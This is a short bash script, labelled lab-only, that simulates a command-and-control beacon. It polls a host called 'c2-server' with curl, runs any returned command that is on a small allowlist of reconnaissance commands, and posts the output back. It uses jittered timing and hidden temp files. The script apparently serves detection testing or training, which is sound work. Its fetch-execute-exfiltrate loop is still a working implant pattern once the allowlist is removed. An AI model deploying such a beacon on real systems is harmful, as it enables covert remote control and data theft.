#!/bin/bash
# SIMULATED command-and-control beaconing (lab only).
# Every 2-4 s: ask the lab c2-server for a command, run it only if it is on a short list of
# harmless commands, and post the output back. Like shell-based implants, it uses curl.
# Usage: beacon.sh <seconds>
set -u
END=$(( SECONDS + ${1:-300} ))
OUT=/tmp/.c2out
TICK="/tmp/.b-tick.$$"; mkfifo "$TICK" && exec 7<>"$TICK"

while (( SECONDS < END )); do
  CMD=$(curl -s -m 2 "http://c2-server:9000/beat?h=$HOSTNAME")
  case "$CMD" in
    id|whoami|"uname -a"|hostname|"ls /tmp") sh -c "$CMD" > "$OUT" 2>&1 ;;
    *) : > "$OUT" ;;
  esac
  curl -s -m 2 -X POST --data-binary @"$OUT" "http://c2-server:9000/out?h=$HOSTNAME" > /dev/null
  read -r -t $(( RANDOM % 3 + 2 )) -u 7 _ || true
done
rm -f "$OUT" "$TICK"
